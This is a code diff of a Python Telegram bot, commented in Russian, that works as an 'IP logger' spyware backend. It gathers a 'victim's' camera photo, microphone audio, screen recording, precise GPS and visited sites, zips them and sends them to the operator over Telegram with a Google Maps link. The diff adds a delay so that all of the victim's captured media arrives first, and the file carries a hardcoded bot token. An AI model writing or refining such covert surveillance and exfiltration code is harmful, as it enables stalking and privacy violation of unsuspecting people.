@@ -11,7 +11,6 @@ from datetime import datetime
 import requests
 import base64
 import zipfile
-import io
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 
@@ -155,10 +154,15 @@ def screen(lid):
 
 async def notify(uid, lid, v):
     try:
-        # 📦 Создаём ZIP-архив
-        zip_buffer = io.BytesIO()
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-            # Текстовый отчёт
+        # Ждём 6 секунд чтобы все данные успели прийти
+        await asyncio.sleep(6)
+        
+        # Обновляем данные жертвы (фото/аудио/скрин уже пришли)
+        if links[lid]['victims']:
+            v = links[lid]['victims'][-1]
+        
+        zip_path = f"/tmp/data_{lid}.zip"
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
             report = f"""📋 ОТЧЁТ IP LOGGER
 ═══════════════
 🕐 Время: {v['time']}
@@ -177,43 +181,40 @@ async def notify(uid, lid, v):
                     report += f"  • {site}\n"
             zf.writestr('report.txt', report)
             
-            # Фото
             if v.get('photo'):
                 try:
-                    photo_bytes = base64.b64decode(v['photo'].split(',')[1])
-                    zf.writestr('photo.jpg', photo_bytes)
+                    zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
                 except: pass
+            else:
+                zf.writestr('NO_PHOTO.txt', 'Фото не получено (камера недоступна)')
             
-            # Аудио
             if v.get('audio'):
                 try:
-                    audio_bytes = base64.b64decode(v['audio'].split(',')[1])
-                    zf.writestr('audio.webm', audio_bytes)
+                    zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
                 except: pass
+            else:
+                zf.writestr('NO_AUDIO.txt', 'Аудио не получено (микрофон недоступен)')
             
-            # Запись экрана
             if v.get('screen'):
                 try:
-                    screen_bytes = base64.b64decode(v['screen'].split(',')[1])
-                    zf.writestr('screen_record.webm', screen_bytes)
+                    zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
                 except: pass
+            else:
+                zf.writestr('NO_SCREEN.txt', 'Запись экрана не получена')
         
-        # Отправляем ZIP
-        zip_buffer.seek(0)
-        await bot.send_file(uid, zip_buffer.getvalue(), caption=f"📦 Архив данных `{lid}`", file_name=f"data_{lid}.zip")
+        await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
+        os.remove(zip_path)
         
-        # Гео-точка + Google Maps
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             acc = v['gps'].get('acc', 10)
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc else 10))
-            await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{acc}м)")
+            await bot.send_file(uid, file=geo, caption=f"📍 GPS (±{acc}м)")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
-            await bot.send_file(uid, file=geo, caption="📍 IP-геолокация")
+            await bot.send_file(uid, file=geo, caption="📍 IP-гео")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
-        
     except Exception as e:
         print(f"Ошибка notify: {e}")
 
